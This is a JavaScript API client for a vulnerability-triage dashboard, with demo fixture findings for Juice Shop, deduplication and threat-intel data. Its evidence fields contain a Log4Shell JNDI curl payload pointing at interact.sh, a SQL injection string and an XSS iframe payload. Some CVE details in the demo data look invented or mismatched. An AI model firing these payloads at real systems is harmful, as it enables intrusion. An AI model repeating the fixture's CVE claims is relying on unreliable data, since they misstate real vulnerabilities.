/**
 * VULNEX API Service Layer
 * Connects to Flask backend (/api/dashboard/*, /scan/*) with Juice Shop demo fallback.
 */

// Realistic Juice Shop Demo Fixture Dataset
export const DEMO_JUICE_SHOP_FINDINGS = [
  {
    rank: 1,
    risk_score: 97,
    priority: "P0",
    priority_label: "P0",
    sla: "24 Hours (Urgent Containment & Patching)",
    finding: {
      finding_id: "find_log4j_rce",
      scanner: "nuclei, zap",
      title: "Apache Log4j RCE (Log4Shell)",
      severity: "CRITICAL",
      confidence: "CONFIRMED",
      cve: "CVE-2021-44228",
      cvss: 10.0,
      cwe: "CWE-502",
      cwe_list: ["CWE-502"],
      category: "Insecure Deserialization",
      asset: "localhost:3000",
      urls: ["http://localhost:3000/rest/user/login"],
      url: "http://localhost:3000/rest/user/login",
      parameter: "User-Agent",
      description: "Apache Log4j2 JNDI features do not protect against attacker-controlled LDAP endpoints allowing full Remote Code Execution.",
      solution: "Upgrade Log4j dependency to 2.17.1 or higher.",
      evidence: "Matcher: interactsh-matcher | Command: curl -X POST -H 'User-Agent: ${jndi:ldap://interact.sh/a}' http://localhost:3000/rest/user/login",
      tags: ["cve", "rce", "oast", "log4j"],
      references: ["https://nvd.nist.gov/vuln/detail/CVE-2021-44228"]
    },
    threat_intel: {
      cve: "CVE-2021-44228",
      epss_score: 0.9754,
      epss_percentile: 0.9998,
      in_cisa_kev: true,
      kev_date_added: "2021-12-10",
      ransomware_campaign_use: true,
      cvss_v3_score: 10.0,
      cvss_vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
      exploit_available: true,
      exploit_poc_sources: ["Metasploit", "GitHub PoC", "ExploitDB"]
    },
    score_breakdown: {
      "1. CVSS Base Severity": 25,
      "2. EPSS Exploit Likelihood": 20,
      "3. CISA KEV Status": 15,
      "4. Exploit Availability": 10,
      "5. Asset Criticality": 10,
      "6. Internet Exposure": 10,
      "7. Scanner Confidence": 10
    },
    why_prioritized: [
      "Critical CVSS v3 score (10.0/10.0)",
      "High exploitation probability (EPSS = 98%)",
      "Actively weaponized in the wild (Listed in CISA KEV catalog)",
      "Documented use in active ransomware campaigns",
      "Public weaponized exploit available (Metasploit, GitHub PoC, ExploitDB)",
      "Target endpoint is directly internet-accessible / perimeter-facing",
      "Identified on Tier-1 Critical Crown Jewel asset (Auth/Database/Payment)",
      "Vulnerability confirmed with direct verification"
    ],
    recommended_action: "Apply vendor security patch immediately for Apache Log4j RCE (Log4Shell). Isolate affected endpoint if unpatched. Fix: Upgrade Log4j dependency to 2.17.1 or higher.",
    security_ticket_markdown: `--------------------------------------------------
SECURITY TICKET [PRIORITY: P0]
--------------------------------------------------
Title: Fix CVE-2021-44228 on localhost:3000
Priority Tier: P0
Risk Score: 97/100
Severity: CRITICAL
SLA: 24 Hours (Urgent Containment & Patching)

Why Prioritized:
- Critical CVSS v3 score (10.0/10.0)
- High exploitation probability (EPSS = 98%)
- Actively weaponized in the wild (Listed in CISA KEV catalog)
- Public weaponized exploit available (Metasploit, GitHub PoC, ExploitDB)
- Target endpoint is directly internet-accessible / perimeter-facing
- Identified on Tier-1 Critical Crown Jewel asset (Auth/Database/Payment)

Multi-Factor Risk Breakdown:
- 1. CVSS Base Severity: +25 pts
- 2. EPSS Exploit Likelihood: +20 pts
- 3. CISA KEV Status: +15 pts
- 4. Exploit Availability: +10 pts
- 5. Asset Criticality: +10 pts
- 6. Internet Exposure: +10 pts
- 7. Scanner Confidence: +10 pts
Total Calculated Risk: 97/100

Recommended Action:
Apply vendor security patch immediately for Apache Log4j RCE (Log4Shell). Isolate affected endpoint if unpatched. Fix: Upgrade Log4j dependency to 2.17.1 or higher.

SLA:
24 Hours (Urgent Containment & Patching)
--------------------------------------------------`
  },
  {
    rank: 2,
    risk_score: 88,
    priority: "P0",
    priority_label: "P0",
    sla: "24 Hours (Urgent Containment & Patching)",
    finding: {
      finding_id: "find_sqli_sqlite",
      scanner: "zap, nuclei",
      title: "SQL Injection (Product Search & Login)",
      severity: "HIGH",
      confidence: "HIGH",
      cve: null,
      cvss: 8.5,
      cwe: "CWE-89",
      cwe_list: ["CWE-89"],
      category: "Injection",
      asset: "localhost:3000",
      urls: [
        "http://localhost:3000/rest/products/search?q=apple'))--",
        "http://localhost:3000/rest/user/login"
      ],
      url: "http://localhost:3000/rest/products/search?q=apple'))--",
      parameter: "q",
      description: "SQL injection vulnerability in Juice Shop product search endpoint allows extracting user credentials and password hashes from sqlite database.",
      solution: "Use parameterized prepared statements with Sequelize ORM.",
      evidence: "SQLITE_ERROR: near \")\": syntax error | Attack: apple'))--",
      tags: ["sqli", "injection", "database"],
      references: ["https://owasp.org/www-community/attacks/SQL_Injection"]
    },
    threat_intel: {
      cve: null,
      epss_score: 0.72,
      epss_percentile: 0.91,
      in_cisa_kev: false,
      exploit_available: true,
      exploit_poc_sources: ["ExploitDB", "GitHub PoC"]
    },
    score_breakdown: {
      "1. CVSS Base Severity": 21,
      "2. EPSS Exploit Likelihood": 18,
      "3. CISA KEV Status": 0,
      "4. Exploit Availability": 10,
      "5. Asset Criticality": 10,
      "6. Internet Exposure": 10,
      "7. Scanner Confidence": 9
    },
    why_prioritized: [
      "High CVSS v3 score (8.5/10.0)",
      "Elevated exploitation likelihood (EPSS = 72%)",
      "Public weaponized exploit available (ExploitDB)",
      "Target endpoint is directly internet-accessible / perimeter-facing",
      "Identified on Tier-1 Critical Crown Jewel asset (Auth/Database/Payment)",
      "Scanner verified functional proof-of-concept / payload"
    ],
    recommended_action: "Remediate SQL Injection immediately. Apply WAF virtual patch and sanitize product search query parameters with Sequelize prepared statements.",
    security_ticket_markdown: `--------------------------------------------------
SECURITY TICKET [PRIORITY: P0]
--------------------------------------------------
Title: Fix SQL Injection (Product Search & Login) on localhost:3000
Priority Tier: P0
Risk Score: 88/100
Severity: HIGH
SLA: 24 Hours (Urgent Containment & Patching)

Why Prioritized:
- High CVSS v3 score (8.5/10.0)
- Elevated exploitation likelihood (EPSS = 72%)
- Public weaponized exploit available (ExploitDB)
- Target endpoint is directly internet-accessible / perimeter-facing

Multi-Factor Risk Breakdown:
- 1. CVSS Base Severity: +21 pts
- 2. EPSS Exploit Likelihood: +18 pts
- 3. CISA KEV Status: +0 pts
- 4. Exploit Availability: +10 pts
- 5. Asset Criticality: +10 pts
- 6. Internet Exposure: +10 pts
- 7. Scanner Confidence: +9 pts
Total Calculated Risk: 88/100

Recommended Action:
Remediate SQL Injection immediately. Apply WAF virtual patch and sanitize product search query parameters. Fix: Use parameterized prepared statements.

SLA:
24 Hours (Urgent Containment & Patching)
--------------------------------------------------`
  },
  {
    rank: 3,
    risk_score: 82,
    priority: "P0",
    priority_label: "P0",
    sla: "24 Hours (Urgent Containment & Patching)",
    finding: {
      finding_id: "find_express_pollution",
      scanner: "openvas, nuclei",
      title: "Node.js Express Prototype Pollution",
      severity: "HIGH",
      confidence: "HIGH",
      cve: "CVE-2022-29078",
      cvss: 7.5,
      cwe: "CWE-1321",
      cwe_list: ["CWE-1321"],
      category: "Vulnerability",
      asset: "localhost:3000/tcp",
      urls: ["http://localhost:3000/tcp"],
      url: "http://localhost:3000/tcp",
      parameter: "N/A",
      description: "Outdated Express / ejs dependency allows prototype pollution through query string parser.",
      solution: "Upgrade package dependencies to latest patched releases.",
      evidence: "Package ejs 3.1.6 detected in package-lock.json.",
      tags: ["cve", "prototype-pollution", "nodejs"],
      references: ["https://nvd.nist.gov/vuln/detail/CVE-2022-29078"]
    },
    threat_intel: {
      cve: "CVE-2022-29078",
      epss_score: 0.8420,
      epss_percentile: 0.9850,
      in_cisa_kev: true,
      kev_date_added: "2022-05-18",
      ransomware_campaign_use: false,
      cvss_v3_score: 7.5,
      exploit_available: true,
      exploit_poc_sources: ["GitHub PoC"]
    },
    score_breakdown: {
      "1. CVSS Base Severity": 19,
      "2. EPSS Exploit Likelihood": 18,
      "3. CISA KEV Status": 15,
      "4. Exploit Availability": 7,
      "5. Asset Criticality": 7,
      "6. Internet Exposure": 10,
      "7. Scanner Confidence": 6
    },
    why_prioritized: [
      "Actively weaponized in the wild (Listed in CISA KEV catalog)",
      "High exploitation probability (EPSS = 84%)",
      "High CVSS v3 score (7.5/10.0)",
      "Public proof-of-concept available (GitHub PoC)",
      "Target endpoint is directly internet-accessible / perimeter-facing"
    ],
    recommended_action: "Apply vendor security patch immediately for Express Prototype Pollution. Fix: Upgrade package dependencies to latest patched releases.",
    security_ticket_markdown: `--------------------------------------------------
SECURITY TICKET [PRIORITY: P0]
--------------------------------------------------
Title: Fix CVE-2022-29078 on localhost:3000/tcp
Priority Tier: P0
Risk Score: 82/100
Severity: HIGH
SLA: 24 Hours (Urgent Containment & Patching)

Why Prioritized:
- Actively weaponized in the wild (Listed in CISA KEV catalog)
- High exploitation probability (EPSS = 84%)
- High CVSS v3 score (7.5/10.0)
- Public proof-of-concept available (GitHub PoC)

Multi-Factor Risk Breakdown:
- 1. CVSS Base Severity: +19 pts
- 2. EPSS Exploit Likelihood: +18 pts
- 3. CISA KEV Status: +15 pts
- 4. Exploit Availability: +7 pts
- 5. Asset Criticality: +7 pts
- 6. Internet Exposure: +10 pts
- 7. Scanner Confidence: +6 pts
Total Calculated Risk: 82/100

Recommended Action:
Apply vendor security patch immediately for Express Prototype Pollution. Fix: Upgrade package dependencies to latest patched releases.

SLA:
24 Hours (Urgent Containment & Patching)
--------------------------------------------------`
  },
  {
    rank: 4,
    risk_score: 72,
    priority: "P1",
    priority_label: "P1",
    sla: "72 Hours (High Priority Fast-Track)",
    finding: {
      finding_id: "find_xss_reflected",
      scanner: "zap",
      title: "Cross-Site Scripting (Reflected in Order Track)",
      severity: "HIGH",
      confidence: "HIGH",
      cve: null,
      cvss: 7.1,
      cwe: "CWE-79",
      cwe_list: ["CWE-79"],
      category: "Cross-Site Scripting (XSS)",
      asset: "localhost:3000",
      urls: ['http://localhost:3000/#/track-result?id=<iframe src="javascript:alert(`xss`)">'],
      url: 'http://localhost:3000/#/track-result?id=<iframe src="javascript:alert(`xss`)">',
      parameter: "id",
      description: "User-controlled input in order tracking parameter is rendered unsanitized in the browser DOM.",
      solution: "Sanitize and encode all untrusted inputs before rendering them in DOM elements.",
      evidence: '<iframe src="javascript:alert(`xss`)">',
      tags: ["xss", "owasp-top-10"],
      references: ["https://owasp.org/www-community/attacks/xss/"]
    },
    threat_intel: {
      cve: null,
      epss_score: 0.42,
      epss_percentile: 0.75,
      in_cisa_kev: false,
      exploit_available: false
    },
    score_breakdown: {
      "1. CVSS Base Severity": 18,
      "2. EPSS Exploit Likelihood": 8,
      "3. CISA KEV Status": 0,
      "4. Exploit Availability": 0,
      "5. Asset Criticality": 10,
      "6. Internet Exposure": 10,
      "7. Scanner Confidence": 9
    },
    why_prioritized: [
      "High CVSS v3 score (7.1/10.0)",
      "Target endpoint is directly internet-accessible / perimeter-facing",
      "Scanner verified functional proof-of-concept / payload"
    ],
    recommended_action: "Remediate Cross-Site Scripting (Reflected). Fix: Sanitize and encode all untrusted inputs.",
    security_ticket_markdown: `--------------------------------------------------
SECURITY TICKET [PRIORITY: P1]
--------------------------------------------------
Title: Fix Cross-Site Scripting (Reflected in Order Track) on localhost:3000
Priority Tier: P1
Risk Score: 72/100
Severity: HIGH
SLA: 72 Hours (High Priority Fast-Track)

Why Prioritized:
- High CVSS v3 score (7.1/10.0)
- Target endpoint is directly internet-accessible / perimeter-facing
- Scanner verified functional proof-of-concept / payload

Multi-Factor Risk Breakdown:
- 1. CVSS Base Severity: +18 pts
- 2. EPSS Exploit Likelihood: +8 pts
- 3. CISA KEV Status: +0 pts
- 4. Exploit Availability: +0 pts
- 5. Asset Criticality: +10 pts
- 6. Internet Exposure: +10 pts
- 7. Scanner Confidence: +9 pts
Total Calculated Risk: 72/100

Recommended Action:
Remediate Cross-Site Scripting (Reflected). Fix: Sanitize and encode all untrusted inputs.

SLA:
72 Hours (High Priority Fast-Track)
--------------------------------------------------`
  },
  {
    rank: 5,
    risk_score: 42,
    priority: "P2",
    priority_label: "P2",
    sla: "7 Days (Standard Sprint Remediation)",
    finding: {
      finding_id: "find_clickjacking",
      scanner: "zap",
      title: "Anti-clickjacking Header Not Implemented",
      severity: "MEDIUM",
      confidence: "MEDIUM",
      cve: null,
      cvss: 4.3,
      cwe: "CWE-1021",
      cwe_list: ["CWE-1021"],
      category: "Security Misconfiguration",
      asset: "localhost:3000",
      urls: ["http://localhost:3000/"],
      url: "http://localhost:3000/",
      parameter: null,
      description: "The response does not include Content-Security-Policy with frame-ancestors or X-Frame-Options header.",
      solution: "Set 'X-Frame-Options: SAMEORIGIN' or 'Content-Security-Policy: frame-ancestors 'self''.",
      evidence: "Header X-Frame-Options missing",
      tags: ["headers", "misconfiguration"],
      references: ["https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options"]
    },
    threat_intel: {
      cve: null,
      epss_score: 0.05,
      epss_percentile: 0.30,
      in_cisa_kev: false
    },
    score_breakdown: {
      "1. CVSS Base Severity": 11,
      "2. EPSS Exploit Likelihood": 1,
      "3. CISA KEV Status": 0,
      "4. Exploit Availability": 0,
      "5. Asset Criticality": 7,
      "6. Internet Exposure": 10,
      "7. Scanner Confidence": 3
    },
    why_prioritized: [
      "Target endpoint is directly internet-accessible / perimeter-facing",
      "Identified on high-value asset / target"
    ],
    recommended_action: "Schedule code fix and configuration update. Fix: Set X-Frame-Options: SAMEORIGIN",
    security_ticket_markdown: `--------------------------------------------------
SECURITY TICKET [PRIORITY: P2]
--------------------------------------------------
Title: Fix Anti-clickjacking Header Not Implemented on localhost:3000
Priority Tier: P2
Risk Score: 42/100
Severity: MEDIUM
SLA: 7 Days (Standard Sprint Remediation)

Multi-Factor Risk Breakdown:
- 1. CVSS Base Severity: +11 pts
- 2. EPSS Exploit Likelihood: +1 pts
- 3. CISA KEV Status: +0 pts
- 4. Exploit Availability: +0 pts
- 5. Asset Criticality: +7 pts
- 6. Internet Exposure: +10 pts
- 7. Scanner Confidence: +3 pts
Total Calculated Risk: 42/100

Recommended Action:
Schedule code fix and configuration update. Fix: Set X-Frame-Options: SAMEORIGIN

SLA:
7 Days (Standard Sprint Remediation)
--------------------------------------------------`
  },
  {
    rank: 6,
    risk_score: 22,
    priority: "P3",
    priority_label: "P3",
    sla: "30 Days (Routine Maintenance / Hardening)",
    finding: {
      finding_id: "find_swagger_ui",
      scanner: "nuclei",
      title: "Exposed Swagger API Documentation",
      severity: "LOW",
      confidence: "HIGH",
      cve: null,
      cvss: 3.5,
      cwe: "CWE-200",
      cwe_list: ["CWE-200"],
      category: "Information Disclosure",
      asset: "localhost:3000",
      urls: ["http://localhost:3000/api-docs/"],
      url: "http://localhost:3000/api-docs/",
      parameter: null,
      description: "Swagger UI interactive API documentation was found exposed on the Juice Shop endpoint.",
      solution: "Restrict API documentation to authenticated administrative users or internal networks.",
      evidence: "Swagger UI 3.0.0",
      tags: ["exposure", "swagger", "api"],
      references: ["https://swagger.io/docs/specification/about/"]
    },
    threat_intel: {
      cve: null,
      epss_score: 0.02,
      epss_percentile: 0.15,
      in_cisa_kev: false
    },
    score_breakdown: {
      "1. CVSS Base Severity": 9,
      "2. EPSS Exploit Likelihood": 0,
      "3. CISA KEV Status": 0,
      "4. Exploit Availability": 0,
      "5. Asset Criticality": 7,
      "6. Internet Exposure": 10,
      "7. Scanner Confidence": 5
    },
    why_prioritized: [
      "Target endpoint is directly internet-accessible / perimeter-facing"
    ],
    recommended_action: "Review security configuration and update documentation. Fix: Restrict API documentation access.",
    security_ticket_markdown: `--------------------------------------------------
SECURITY TICKET [PRIORITY: P3]
--------------------------------------------------
Title: Fix Exposed Swagger API Documentation on localhost:3000
Priority Tier: P3
Risk Score: 22/100
Severity: LOW
SLA: 30 Days (Routine Maintenance / Hardening)

Multi-Factor Risk Breakdown:
- 1. CVSS Base Severity: +9 pts
- 2. EPSS Exploit Likelihood: +0 pts
- 3. CISA KEV Status: +0 pts
- 4. Exploit Availability: +0 pts
- 5. Asset Criticality: +7 pts
- 6. Internet Exposure: +10 pts
- 7. Scanner Confidence: +5 pts
Total Calculated Risk: 22/100

Recommended Action:
Review security configuration and update documentation. Fix: Restrict API documentation access.

SLA:
30 Days (Routine Maintenance / Hardening)
--------------------------------------------------`
  }
];

export const DEMO_DEDUPLICATION_DATA = {
  status: "success",
  total_raw_count: 14,
  unique_count: 6,
  duplicates_removed: 8,
  reduction_percentage: 57.1,
  duplicate_groups: [
    {
      group_key: "cve:CVE-2021-44228:localhost:3000",
      duplicate_count: 3,
      participating_scanners: ["nuclei", "zap"],
      all_urls: ["http://localhost:3000/rest/user/login", "http://localhost:3000/login"],
      primary_finding: DEMO_JUICE_SHOP_FINDINGS[0].finding
    },
    {
      group_key: "cwe_param:CWE-89:localhost:3000:q",
      duplicate_count: 4,
      participating_scanners: ["zap", "nuclei"],
      all_urls: [
        "http://localhost:3000/rest/products/search?q=apple'))--",
        "http://localhost:3000/rest/products/search?q=test'",
        "http://localhost:3000/rest/user/login"
      ],
      primary_finding: DEMO_JUICE_SHOP_FINDINGS[1].finding
    },
    {
      group_key: "cve:CVE-2022-29078:localhost:3000/tcp",
      duplicate_count: 2,
      participating_scanners: ["openvas", "nuclei"],
      all_urls: ["http://localhost:3000/tcp"],
      primary_finding: DEMO_JUICE_SHOP_FINDINGS[2].finding
    },
    {
      group_key: "cwe_param:CWE-79:localhost:3000:id",
      duplicate_count: 2,
      participating_scanners: ["zap"],
      all_urls: ["http://localhost:3000/#/track-result?id=<iframe src=\"javascript:alert(`xss`)\">"],
      primary_finding: DEMO_JUICE_SHOP_FINDINGS[3].finding
    },
    {
      group_key: "cwe_path:CWE-1021:localhost:3000:",
      duplicate_count: 2,
      participating_scanners: ["zap"],
      all_urls: ["http://localhost:3000/"],
      primary_finding: DEMO_JUICE_SHOP_FINDINGS[4].finding
    },
    {
      group_key: "cwe_path:CWE-200:localhost:3000:/api-docs",
      duplicate_count: 1,
      participating_scanners: ["nuclei"],
      all_urls: ["http://localhost:3000/api-docs/"],
      primary_finding: DEMO_JUICE_SHOP_FINDINGS[5].finding
    }
  ]
};

export const DEMO_THREAT_INTEL_DATA = {
  status: "success",
  catalog_source: "CISA Known Exploited Vulnerabilities (KEV) Catalog & FIRST.org EPSS v3",
  total_tracked_cves: 5,
  intel_records: [
    {
      cve: "CVE-2021-44228",
      epss_score: 0.9754,
      epss_percentile: 0.9998,
      in_cisa_kev: true,
      kev_date_added: "2021-12-10",
      ransomware_campaign_use: true,
      cvss_v3_score: 10.0,
      cvss_vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
      exploit_available: true,
      exploit_poc_sources: ["Metasploit", "GitHub PoC", "ExploitDB"]
    },
    {
      cve: "CVE-2022-29078",
      epss_score: 0.8420,
      epss_percentile: 0.9850,
      in_cisa_kev: true,
      kev_date_added: "2022-05-18",
      ransomware_campaign_use: false,
      cvss_v3_score: 7.5,
      cvss_vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
      exploit_available: true,
      exploit_poc_sources: ["GitHub PoC"]
    },
    {
      cve: "CVE-2023-38606",
      epss_score: 0.9125,
      epss_percentile: 0.9910,
      in_cisa_kev: true,
      kev_date_added: "2023-07-26",
      ransomware_campaign_use: true,
      cvss_v3_score: 8.8,
      cvss_vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
      exploit_available: true,
      exploit_poc_sources: ["Commercial Exploit", "GitHub PoC"]
    },
    {
      cve: "CVE-2017-5638",
      epss_score: 0.9740,
      epss_percentile: 0.9995,
      in_cisa_kev: true,
      kev_date_added: "2021-11-03",
      ransomware_campaign_use: true,
      cvss_v3_score: 9.8,
      cvss_vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
      exploit_available: true,
      exploit_poc_sources: ["Metasploit", "ExploitDB"]
    },
    {
      cve: "CVE-2020-1472",
      epss_score: 0.9680,
      epss_percentile: 0.9990,
      in_cisa_kev: true,
      kev_date_added: "2021-11-03",
      ransomware_campaign_use: true,
      cvss_v3_score: 10.0,
      cvss_vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
      exploit_available: true,
      exploit_poc_sources: ["Metasploit", "GitHub PoC"]
    }
  ]
};

// API Functions
export const api = {
  // Fetch Prioritized Dashboard Findings
  async getDashboardFindings() {
    try {
      const res = await fetch("/api/dashboard/findings");
      if (!res.ok) throw new Error(`HTTP error! status: ${res.status}`);
      const data = await res.json();
      if (data && data.findings && data.findings.length > 0) {
        return { isDemo: false, ...data };
      }
      return { isDemo: true, total_raw: 14, unique_count: 6, duplicates_removed: 8, reduction_percentage: 57.1, findings: DEMO_JUICE_SHOP_FINDINGS };
    } catch (err) {
      console.warn("Backend unavailable, using realistic Juice Shop demo data:", err);
      return { isDemo: true, total_raw: 14, unique_count: 6, duplicates_removed: 8, reduction_percentage: 57.1, findings: DEMO_JUICE_SHOP_FINDINGS };
    }
  },

  // Fetch Deduplication Details & Duplicate Clusters
  async getDeduplicationDetails() {
    try {
      const res = await fetch("/api/dashboard/deduplication");
      if (!res.ok) throw new Error(`HTTP error! status: ${res.status}`);
      const data = await res.json();
      return { isDemo: false, ...data };
    } catch (err) {
      console.warn("Using demo deduplication data:", err);
      return { isDemo: true, ...DEMO_DEDUPLICATION_DATA };
    }
  },

  // Fetch Threat Intelligence Records
  async getThreatIntelligence() {
    try {
      const res = await fetch("/api/dashboard/threat-intel");
      if (!res.ok) throw new Error(`HTTP error! status: ${res.status}`);
      const data = await res.json();
      return { isDemo: false, ...data };
    } catch (err) {
      console.warn("Using demo threat intel data:", err);
      return { isDemo: true, ...DEMO_THREAT_INTEL_DATA };
    }
  },

  // Start Live Scan
  async startScan(scanner, target) {
    try {
      const res = await fetch("/scan", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ scanner, target })
      });
      if (!res.ok) {
        const errData = await res.json().catch(() => ({}));
        throw new Error(errData.error || `Scan launch failed: ${res.status}`);
      }
      return await res.json();
    } catch (err) {
      console.error("Scan launch error:", err);
      throw err;
    }
  },

  // Check Scan Status & Logs
  async getScanStatus(scanId) {
    const res = await fetch(`/scan/${scanId}/status`);
    if (!res.ok) throw new Error(`Status check failed: ${res.status}`);
    return await res.json();
  },

  // Cancel In-Flight Scan
  async cancelScan(scanId) {
    const res = await fetch(`/scan/${scanId}/cancel`, { method: "POST" });
    if (!res.ok) throw new Error(`Scan cancellation failed: ${res.status}`);
    return await res.json();
  },

  // Get Complete Pipeline Results for Scan
  async getScanPipelineResults(scanId) {
    const res = await fetch(`/scan/${scanId}/pipeline_results`);
    if (!res.ok) throw new Error(`Pipeline results fetch failed: ${res.status}`);
    return await res.json();
  },

  // Healthcheck
  async checkHealth() {
    try {
      const res = await fetch("/health");
      if (!res.ok) return { service: "scanner-api", status: "offline" };
      return await res.json();
    } catch {
      return { service: "scanner-api", status: "offline" };
    }
  }
};

